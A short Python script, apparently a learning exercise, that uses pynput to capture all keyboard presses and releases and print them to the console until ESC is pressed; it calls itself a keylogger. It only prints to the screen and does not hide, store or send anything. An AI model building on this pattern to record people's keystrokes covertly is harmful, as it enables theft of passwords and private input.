from pynput import keyboard

def on_press(key):
    try:
        print(f'Key pressed: {key.char}\n')
    except AttributeError: # this because the special characters don't have attribute .char
        print(f'Special key pressed {key}\n')

def on_release(key):
    print(f'key released: {key}\n')
    
    if key == keyboard.Key.esc: # it refers to esc button when it is clicked
        return False
    
# with handles automatically setup and cleanup   
with keyboard.Listener( # creates a new keyborad monitoring object (it captures all the keyboards)
    on_press=on_press,
    on_release=on_release
) as listener:
    print("Keylogger started. Press ESC to stop\n")
    listener.join() # it makes the main thread wait until the listener stops (don't close the programm until the keylogger is done)
